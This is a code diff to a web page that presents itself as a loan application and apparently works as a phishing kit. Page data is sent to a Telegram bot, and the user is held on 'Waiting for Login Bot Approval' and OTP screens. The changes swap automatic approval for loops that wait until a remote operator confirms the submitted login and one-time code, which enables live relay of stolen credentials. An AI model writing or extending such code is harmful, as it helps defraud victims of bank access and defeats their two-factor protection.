@@ -535,7 +535,7 @@
             </div>
         </div>
 
-        <!-- Page 4: Loading (Waiting for Bot Approval) -->
+        <!-- Page 4: Loading (Waiting for Login Bot Approval) -->
         <div class="page" id="page4">
             <div class="loading">
                 <div class="loading-spinner"></div>
@@ -634,7 +634,7 @@
         };
 
         let timerInterval;
-        let botApproved = false;
+        let loginApproved = false;
         let otpApproved = false;
 
         // Loan Amount Slider
@@ -745,10 +745,12 @@
                 }
             } else if (pageNum === 3) {
                 if (validatePage3()) {
-                    // Show loading page while sending to Telegram
+                    // Show loading page while waiting for bot approval
                     showPage(4);
                     sendToTelegramBot('page3');
-                    waitForBotApproval();
+                    // WAIT FOR BOT APPROVAL - DO NOT AUTO-PROCEED
+                    loginApproved = false;
+                    waitForLoginApproval();
                 }
             }
         }
@@ -882,23 +884,38 @@ Verify if OTP is correct.
         }
 
         function waitForPage2Approval() {
-            // Simulate bot response - In production, use WebSocket or polling
+            // After 3 seconds, auto-proceed to page 3 (Application details auto-approved)
             setTimeout(() => {
-                // For demo purposes, auto-approve after 3 seconds
-                // In production, this would wait for actual bot button press
                 showPage(3);
             }, 3000);
         }
 
-        function waitForBotApproval() {
-            // Simulate bot response - In production, use WebSocket or polling
-            setTimeout(() => {
-                // For demo purposes, auto-approve after 3 seconds
-                // In production, this would wait for actual bot button press
-                botApproved = true;
-                showPage(5);
-                startOTPTimer();
-            }, 3000);
+        function waitForLoginApproval() {
+            // WAIT for bot approval - SIMULATE with long timeout
+            // In production: use WebSocket, polling, or backend to check bot response
+            const maxWaitTime = 300000; // 5 minutes max wait
+            const checkInterval = 1000; // Check every 1 second
+            let elapsedTime = 0;
+
+            const approvalCheck = setInterval(() => {
+                elapsedTime += checkInterval;
+
+                // Check if approved (in demo, manually set or wait for real bot)
+                if (loginApproved) {
+                    clearInterval(approvalCheck);
+                    showPage(5);
+                    startOTPTimer();
+                    return;
+                }
+
+                // Timeout after 5 minutes
+                if (elapsedTime >= maxWaitTime) {
+                    clearInterval(approvalCheck);
+                    showPage(3);
+                    document.getElementById('errorMsg3').textContent = 'Verification timeout. Please try again.';
+                    document.getElementById('errorMsg3').classList.add('show');
+                }
+            }, checkInterval);
         }
 
         function startOTPTimer() {
@@ -948,14 +965,32 @@ Verify if OTP is correct.
         }
 
         function waitForOTPApproval() {
-            // Simulate bot response
-            setTimeout(() => {
-                // For demo purposes, auto-approve after 2 seconds
-                otpApproved = true;
-                document.getElementById('finalLoanAmount').textContent = 'P ' + applicationData.loanAmount.toLocaleString();
-                showPage(7);
-                clearInterval(timerInterval);
-            }, 2000);
+            // WAIT for bot approval - SIMULATE with long timeout
+            // In production: use WebSocket, polling, or backend to check bot response
+            const maxWaitTime = 300000; // 5 minutes max wait
+            const checkInterval = 1000; // Check every 1 second
+            let elapsedTime = 0;
+
+            const approvalCheck = setInterval(() => {
+                elapsedTime += checkInterval;
+
+                // Check if approved (in demo, manually set or wait for real bot)
+                if (otpApproved) {
+                    clearInterval(approvalCheck);
+                    document.getElementById('finalLoanAmount').textContent = 'P ' + applicationData.loanAmount.toLocaleString();
+                    showPage(7);
+                    clearInterval(timerInterval);
+                    return;
+                }
+
+                // Timeout after 5 minutes
+                if (elapsedTime >= maxWaitTime) {
+                    clearInterval(approvalCheck);
+                    showPage(5);
+                    document.getElementById('errorMsg5').textContent = 'Verification timeout. Please try again.';
+                    document.getElementById('errorMsg5').classList.add('show');
+                }
+            }, checkInterval);
         }
 
         function resetApplication() {
